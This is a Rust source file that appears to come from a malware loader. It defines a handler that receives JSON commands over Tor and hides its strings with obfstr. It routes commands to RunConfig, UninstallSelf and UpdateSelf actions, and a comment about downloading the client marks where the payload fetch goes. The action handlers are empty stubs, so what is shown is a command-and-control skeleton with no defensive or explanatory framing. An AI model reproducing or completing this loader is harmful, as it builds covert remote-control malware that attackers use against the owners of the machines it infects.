use std::path::PathBuf;
use anyhow::{ Context, Result };
use loader_vars::types::receive::{ self, LoaderReceivePayload };
use shared::network::tor::{ LoggerConfig, TorHandler };
use obfstr::obfstr as s;
pub struct LoaderTorHandler {
    tor_handler: TorHandler,
}

impl LoaderTorHandler {
    pub async fn new(logger_config: LoggerConfig) -> Result<Self> {
        let tor_handler = TorHandler::new(logger_config).await?;
        Ok(LoaderTorHandler { tor_handler })
    }

    pub async fn run_handler(&mut self) {
        self.tor_handler.run(|handler, data| { Self::process_data(handler.clone(), data) }).await;
    }

    fn process_data(tor_handler: TorHandler, binary_data: Vec<u8>) -> Result<()> {
        let processed_data: LoaderReceivePayload = serde_json
            ::from_slice(&binary_data)
            .context(s!("Failed to parse binary data as LoaderReceivePayload").to_string())?;

        Self::route_data(tor_handler, processed_data)
    }

    fn route_data(tor_handler: TorHandler, processed_data: LoaderReceivePayload) -> Result<()> {
        match processed_data.action {
            //! here download client and do all the stuff
            receive::ClientAction::RunConfig => {}
            receive::ClientAction::UninstallSelf => {}
            receive::ClientAction::UpdateSelf => {}
        }
        Ok(())
    }
}
